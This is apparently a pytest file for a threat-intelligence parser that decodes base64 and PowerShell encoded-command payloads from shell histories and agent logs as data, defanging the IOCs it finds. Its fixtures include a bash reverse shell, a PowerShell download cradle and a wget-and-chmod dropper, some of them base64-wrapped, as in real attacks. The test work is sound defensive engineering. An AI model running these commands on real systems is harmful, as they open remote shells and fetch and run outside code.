"""Parse decodes base64 payloads and PowerShell -EncodedCommand blobs as plain data, never run, and stores what they
hold as child lines: defanged, with provenance, glossed by the rules and searched for IOCs, and never context."""

import base64
import hashlib
import os

import pytest

from interlinear_cti import decode, pyz
from interlinear_cti.glossing import apply_glosses, apply_rules, pending_lines
from interlinear_cti.render import render_markdown
from interlinear_cti.rules import load_library

AT = "2026-10-22T00:00:00Z"
SHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"
STAGE2 = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/stage2.ps1')"


def b64(text: str, encoding: str = "utf-8") -> str:
    return base64.b64encode(text.encode(encoding)).decode("ascii")


def sha(token: str) -> str:
    return hashlib.sha256(token.encode("ascii")).hexdigest()


def glossed(parse_text, resolver, name, text):
    transcript = parse_text(name, text)
    apply_rules(transcript, load_library(resolver=resolver), at=AT)
    return transcript


def test_a_base64_reverse_shell_becomes_a_glossed_child_line_with_its_iocs(parse_text, resolver):
    token = b64(SHELL)
    transcript = glossed(parse_text, resolver, ".bash_history", f"echo {token} | base64 -d | bash\n")
    parent, child = transcript.lines
    assert parent.decoded is None and parent.gloss.rule_id == "decode-pipe-shell"
    assert child.text == "bash -i >& /dev/tcp/198.51.100[.]7/4444 0>&1"
    assert child.decoded.model_dump() == {"parent": 1, "depth": 1, "encoding": "base64", "sha256": sha(token),
                                          "length": len(token), "truncated": False}
    assert (child.source, child.line, child.actor) == (parent.source, parent.line, parent.actor)
    assert child.gloss.rule_id == "reverse-shell"
    assert ("ipv4", "198.51.100[.]7") in [(i.type, i.value) for i in child.gloss.iocs]


def test_a_powershell_encoded_command_is_decoded_from_utf16le_and_keeps_its_hash(parse_text, resolver):
    token = b64(STAGE2, "utf-16-le")
    assert len(token) >= 200  # long enough to be stored as a blob marker in the line itself
    transcript = glossed(parse_text, resolver, "ConsoleHost_history.txt", f"powershell -NoP -w hidden -enc {token}\n")
    parent, child = transcript.lines
    assert f"<blob sha256={sha(token)} len={len(token)}>" in parent.text
    assert child.text == "IEX (New-Object Net.WebClient).DownloadString('hxxp://203.0.113[.]9/stage2.ps1')"
    assert child.decoded.encoding == "base64-utf16le" and child.decoded.sha256 == sha(token)
    assert child.gloss.rule_id == "powershell-download-cradle"
    assert ("url", "hxxp://203.0.113[.]9/stage2.ps1") in [(i.type, i.value) for i in child.gloss.iocs]


def test_a_decoded_script_becomes_one_child_line_per_command(parse_text):
    token = b64("cd /tmp; wget http://203.0.113.5/x -O x\nchmod +x x")
    transcript = parse_text(".bash_history", f"echo {token} | base64 --decode | sh\n")
    assert [line.text for line in transcript.lines[1:]] == ["cd /tmp", "wget hxxp://203.0.113[.]5/x -O x",
                                                            "chmod +x x"]
    assert {line.decoded.parent for line in transcript.lines[1:]} == {1}


def test_a_decoded_line_is_never_context(parse_text, resolver):
    token = b64("cd /tmp/x")  # no = padding, which reads as an assignment and ends context for the file
    transcript = glossed(parse_text, resolver, ".bash_history", f"echo {token} | base64 -d | bash\ncd /tmp\n")
    assert [(line.text, line.gloss.source) for line in transcript.lines] == [
        (transcript.lines[0].text, "rule"), ("cd /tmp/x", "pending"), ("cd /tmp", "none")]
    for source in ("model", "analyst"):
        entry = {"n": 2, "meaning": "Moves to /tmp.", "context": True, "confidence": "high"}
        _, rejected = apply_glosses(transcript, [entry], source=source, by="x", resolver=resolver, at=AT)
        assert rejected == ["line 2: a line decoded from an encoded payload is never context"]


def test_nested_payloads_are_decoded_to_a_depth_limit(parse_text):
    text = "id"
    for _ in range(decode.MAX_DEPTH + 2):
        text = f"echo {b64(text)} | base64 -d | sh"
    transcript = parse_text(".bash_history", text + "\n")
    depths = [line.decoded.depth for line in transcript.lines if line.decoded]
    assert depths == list(range(1, decode.MAX_DEPTH + 1))
    parents = [line.decoded.parent for line in transcript.lines if line.decoded]
    assert parents == list(range(1, decode.MAX_DEPTH + 1))


def test_a_large_payload_is_decoded_only_up_to_the_cap(parse_text, monkeypatch):
    monkeypatch.setattr(decode, "MAX_DECODED_BYTES", 30)
    token = b64("echo " + "A" * 100)
    transcript = parse_text(".bash_history", f"echo {token} | base64 -d | sh\n")
    child = transcript.lines[1]
    assert child.decoded.truncated and child.text == "echo " + "A" * 25


@pytest.mark.parametrize("line", [
    "echo " + base64.b64encode(os.urandom(48)).decode() + " | base64 -d > blob.bin",  # not text
    "echo " + b64("whoami; id") + " > note.txt",  # no decoder on the line
    "base64 -d payload.b64 | sh",  # nothing inline to decode
    "cd /usr/local/share/applications && ls",
])
def test_lines_without_an_inline_text_payload_get_no_child(parse_text, line):
    assert all(l.decoded is None for l in parse_text(".bash_history", line + "\n").lines)


def test_an_agent_tool_call_payload_is_decoded_too(parse_text):
    import json

    record = {"role": "tool_call", "input": f"echo {b64(SHELL)} | base64 -d | bash"}
    transcript = parse_text("run.jsonl", json.dumps(record) + "\n")
    child = [line for line in transcript.lines if line.decoded][0]
    assert child.actor == "agent_tool" and child.text.startswith("bash -i >& /dev/tcp/")


def test_pending_and_render_say_where_a_decoded_line_came_from(parse_text, resolver):
    transcript = glossed(parse_text, resolver, ".bash_history", f"echo {b64('frobnicate --all')} | base64 -d | sh\n")
    assert pending_lines(transcript) == [{"n": 2, "actor": "operator", "text": "frobnicate --all", "decoded_from": 1}]
    assert "   2  [decoded from line 1] frobnicate --all" in render_markdown(transcript)


def test_decoded_text_never_reaches_the_transcript_unescaped(parse_text):
    token = b64("echo hello there, friend\x1b]52;c;aGk=\x07")
    child = parse_text(".bash_history", f"echo {token} | base64 -d | sh\n").lines[1]
    assert "\x1b" not in child.text and "\x07" not in child.text


def _decode_all(text):
    return [decode.decode_payload(token, encoding) for token, encoding in decode.payloads(text)]


def _best(text, reps=3):
    import time

    best = float("inf")
    for _ in range(reps):
        start = time.perf_counter()
        _decode_all(text)
        best = min(best, time.perf_counter() - start)
    return best


@pytest.mark.parametrize("unit", ["/e A", "-e ", "-en ", "base64 -", "base64 -x ", "base64 -w 0 ", "A=", "AAAAAAAA=== ",
                                  "AAAAAAAAA ", "/", "+", "atob(", "pwsh -e AAAAAAAA ", "-e 'AAAAAAAA", "\t-"])
def test_finding_and_decoding_payloads_scales_linearly(unit):
    # A line of 16,384 characters must take less than 8 times as long as one of 4,096: about 4 times when linear.
    head = "powershell base64 -d "
    small, large = (head + unit * (n // len(unit)) for n in (4096, 16384))
    small_time, large_time = _best(small), _best(large)
    assert large_time < 0.25, large_time  # a sanity ceiling only
    assert large_time < 0.002 or large_time < 8 * small_time, (unit, small_time, large_time)


def test_the_parse_zipapp_carries_the_decoder():
    assert "decode.py" in pyz.PARSE_FILES
